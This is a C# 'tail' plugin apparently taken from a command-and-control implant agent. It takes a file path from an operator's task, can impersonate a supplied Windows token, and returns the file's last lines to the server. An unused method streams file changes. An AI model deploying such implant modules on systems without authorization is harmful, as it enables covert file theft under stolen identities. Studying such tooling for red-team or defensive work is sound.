﻿using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "tail";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            if (!args.ContainsKey("path") || string.IsNullOrEmpty(args["path"].ToString()))
            {
                messageManager.Write("Please specify a path!", job.task.id, true, "error");
                return;
            }
            string path = args["path"].ToString();
            int lines = 5;
            if (args.ContainsKey("lines"))
            {
                try
                {
                    lines = int.Parse(args["lines"]);
                }
                catch
                {
                    lines = 5;
                }
            }
            try
            {
                List<string> text = File.ReadLines(path).Reverse().Take(lines).ToList();
                text.Reverse();

                await messageManager.AddResponse(new ResponseResult
                {
                    completed = true,
                    user_output = string.Join(Environment.NewLine, text),
                    task_id = job.task.id,
                });
            }
            catch (Exception e)
            {
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }
        private async Task Wach(string filePath, string task_id, CancellationToken token)
        {
            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            using (StreamReader streamReader = new StreamReader(fileStream))
            {
                // Display existing content of the file
                await this.messageManager.Write(streamReader.ReadToEnd(), task_id, false);

                // Set up a FileSystemWatcher to monitor the file for changes
                using (FileSystemWatcher watcher = new FileSystemWatcher(Path.GetDirectoryName(filePath), Path.GetFileName(filePath)))
                {
                    watcher.NotifyFilter = NotifyFilters.LastWrite | NotifyFilters.Size;

                    watcher.Changed += (sender, e) =>
                    {

                        // Read and display new lines
                        while (!streamReader.EndOfStream)
                        {
                            this.messageManager.Write(streamReader.ReadLine(), task_id, false);
                        }
                    };

                    // Start watching
                    watcher.EnableRaisingEvents = true;

                    while (!token.IsCancellationRequested)
                    {
                        await Task.Delay(1000);
                    }
                }
            }
        }
    }

}
